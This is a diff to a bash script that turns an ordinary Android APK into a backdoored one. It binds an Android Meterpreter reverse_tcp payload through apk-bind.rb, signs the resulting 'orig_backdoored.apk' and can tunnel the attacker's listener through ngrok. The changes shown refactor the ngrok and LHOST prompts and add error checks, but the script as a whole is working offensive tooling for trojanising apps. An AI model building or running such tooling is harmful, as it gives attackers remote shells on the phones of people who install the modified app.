@@ -16,6 +16,11 @@ function line {
    echo -e "$blue---------------------------------------------------------------------------$nocol"
 }
 
+function kill_ng {
+   killme=$(pidof `which ngrok`)
+   if [ -n "$killme" ];then for p in "$killme";do kill -9 $p; done; fi
+}
+
 function disp_banner {
    echo -ne $cyan
    echo "    ___    ____  __ __             ____  _____  ____    ____  ___    ____  ";
@@ -34,7 +39,7 @@ disp_banner
 line
 
 # check for root
-if [ $(echo $UID) -ne 0 ]; then echo -e "$red Run this Script as root !!"; echo -e $nocol; exit 1; fi
+if [ $(echo $UID) -ne 0 ]; then echo -e "$red Run this Script as root !!$nocol"; exit 1; fi
 
 # setting up work directory
 export work_dir="/tmp/apk-payload/$(date +%d%m%y_%H%M%S)"
@@ -91,20 +96,21 @@ function exec_ngrok {
 }
 
 # fetching ngrok and placing it in /usr/bin
-if ! [ -e /usr/bin/ngrok ];then
-   echo -en "$yellow -> ngrok not found ! Do you want to download (y/n) ? $green"
-   read dwn
-   if [ "$dwn" == "y" -o "$dwn" == "Y" ];then
-   echo -ne "$yellow -> Downloading ngrok\t\t[$nocol"
-   wget -qO $work_dir/ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
-   if [ `unzip -l $work_dir/ngrok.zip 1>/dev/null 2>/dev/null; echo $?` -eq 0 ];then
-      echo -e "$green DONE$yellow ] $nocol"
-      echo -ne "$yellow -> Placing ngrok at /usr/bin\t[$nocol"
-      unzip -qq $work_dir/ngrok.zip -d /usr/bin/
-      if [ $? -eq 0 ];then echo -e "$green DONE$yellow ] $nocol"; else echo -e "$red FAILED$yellow ] $nocol"; fi
-   else rm $work_dir/ngrok.zip 2>/dev/null; echo -e "$red FAILED$yellow ] $nocol"; exit 1; fi
+echo -en "$yellow -> Do you want to use ngrok (y/n) ? $green"
+read ng
+if [ "$ng" == "y" -o "$ng" == "Y" ];then
+   if ! [ -e /usr/bin/ngrok ];then
+      echo -ne "$yellow -> Downloading ngrok\t\t[$nocol"
+      wget -qO $work_dir/ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
+      if [ `unzip -l $work_dir/ngrok.zip 1>/dev/null 2>/dev/null; echo $?` -eq 0 ];then
+         echo -e "$green DONE$yellow ] $nocol"
+         echo -ne "$yellow -> Placing ngrok at /usr/bin\t[$nocol"
+         unzip -qq $work_dir/ngrok.zip -d /usr/bin/
+         if [ $? -eq 0 ];then echo -e "$green DONE$yellow ] $nocol"; else echo -e "$red FAILED$yellow ] $nocol"; fi
+      else rm $work_dir/ngrok.zip 2>/dev/null; echo -e "$red FAILED$yellow ] $nocol"; exit 1; fi
+   else exec_ngrok
    fi
-else exec_ngrok
+else ng="no"
 fi
 
 # fetch apk-embed-payload.rb
@@ -146,12 +152,16 @@ export apk_name=mod-$(basename "$apk_path")
 cp "$apk_path" $work_dir/orig.apk 2>/dev/null
 echo -ne $nocol
 ip=`hostname -I`
-if [ -z "$ip" ];then
+if [ "$ng" != "no" ];then
 	echo -en "$yellow -> Enter LHOST : $green"
 	read lhost
 else
-	echo -e "$yellow -> LHOST :$green $ip"
-	lhost="$ip"
+	if [ -n "$ip" ];then
+	   echo -e "$yellow -> LHOST :$green $ip"
+	   echo -en "$yellow -> Do you want to use that LHOST (y/n) ? $green"
+	   read lh
+	   if [ "$lh" == "y" -o "$lh" == "Y" ];then lhost="$ip"; else echo -en "$yellow -> Enter LHOST : $green"; read lhost; fi
+   fi
 fi
 echo -ne $nocol
 echo -en "$yellow -> Enter LPORT : $green"
@@ -159,15 +169,16 @@ read lport
 echo -ne $nocol
 export payload="android/meterpreter/reverse_tcp"
 cd $work_dir
+if [ `which msfvenom | wc -l` -eq 0 ];then echo -e "$red metasploit framework NOT found !!$nocol"; kill_ng; exit 1; fi
 line
 ruby apk-bind.rb orig.apk -p $payload $lhost $lport
 
 # check for payload and sign it
 export apk_out=$(find $work_dir -iname "orig_backdoored.apk")
-if [ -n $apk_out ];then
+if [ -n "$apk_out" ];then
    cd $work_dir/dexTools
    ./d2j-apk-sign.sh "$apk_out"
-   if [ -e "orig_backdoored-signed.apk" ];then apk_out="$work_dir/$apk_name"; fi
+   if [ -e "orig_backdoored-signed.apk" ];then apk_out="$work_dir/$apk_name"; else echo -e "$red Unable to sign the apk !!$nocol"; kill_ng; exit 1; fi
    line
    echo -e "$yellow -> Your modified apk is at\n$green $apk_out $nocol"
    line
@@ -177,5 +188,4 @@ if [ -n $apk_out ];then
 else echo -e "$red Unable to bind$green $apk_name $red!! $nocol"
 fi
 line
-killme=$(pidof `which ngrok`)
-if [ -n "$killme" ];then for p in "$killme";do kill -9 $p; done; fi
+kill_ng
